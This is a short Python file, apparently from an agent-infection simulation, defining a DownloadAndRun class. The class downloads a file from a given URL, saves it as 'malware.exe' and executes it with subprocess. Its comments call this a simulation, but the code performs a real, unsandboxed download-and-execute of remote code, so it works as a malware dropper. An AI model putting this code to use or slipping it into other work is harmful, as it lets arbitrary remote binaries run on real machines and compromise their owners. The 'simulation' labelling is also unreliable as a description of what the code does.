import requests
import subprocess
import os

class DownloadAndRun:
    def __init__(self, download_url, save_path="malware.exe"):
        self.download_url = download_url
        self.save_path = save_path

    def execute(self):
        # Step 1: Download the file
        response = requests.get(self.download_url)
        with open(self.save_path, "wb") as f:
            f.write(response.content)

        # Step 2: Simulate running the downloaded exe
        try:
            subprocess.run([self.save_path], check=True)
            print(f"Simulation: Executable {self.save_path} ran successfully.")
        except Exception as e:
            print(f"Simulation Error: {e}")

        # Optional: Mark the agent as "compromised"
        # You can set a flag or agent state to simulate infection
        # agent.state['infected'] = True
